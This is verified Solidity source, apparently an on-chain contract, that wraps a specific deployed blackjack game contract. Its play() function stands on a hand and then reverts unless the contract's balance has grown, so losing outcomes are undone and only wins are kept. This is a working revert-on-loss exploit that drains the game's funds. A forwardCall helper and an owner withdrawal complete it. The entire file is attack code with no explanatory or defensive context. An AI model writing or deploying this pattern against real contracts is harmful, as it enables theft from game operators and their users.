/**
 *Submitted for verification at Arbiscan.io on 2026-01-02
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBlackjack {
    function Blackjack_Start(uint256 wager, address tokenAddress) external payable;
    function Blackjack_Stand() external;
    function Blackjack_Hit() external payable;
}

contract Test {
    address public immutable owner;
    IBlackjack public immutable blackjackGame;

    constructor() {
        owner = msg.sender;
        blackjackGame = IBlackjack(0x2a234323506A10D82D998e9365E0b3D5b8De95c8);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    function start(uint256 wager, uint256 fee) external onlyOwner {
        uint256 vrfFee = wager + fee;
        blackjackGame.Blackjack_Start{value: vrfFee}(wager, address(0));
    }

    function play() external onlyOwner {
        uint256 prevBalance = address(this).balance;

        blackjackGame.Blackjack_Stand();

        uint256 balance = address(this).balance;

        require(balance > prevBalance, "Balance error");
    }

    function withdraw() external onlyOwner {
        uint256 balance = address(this).balance;
        require(balance > 0, "No balance to withdraw");
        (bool success, ) = payable(owner).call{value: balance}("");
        require(success, "Withdrawal failed");
    }

    function hit() external onlyOwner payable {
        blackjackGame.Blackjack_Hit{value: msg.value}();
    }

    function forwardCall(bytes calldata data) external  onlyOwner payable returns (bytes memory) {
        (bool success, bytes memory result) = address(blackjackGame).call{value: msg.value}(data);
        require(success, "Forwarded call failed");
        return result;
    }

    receive() external payable {}
}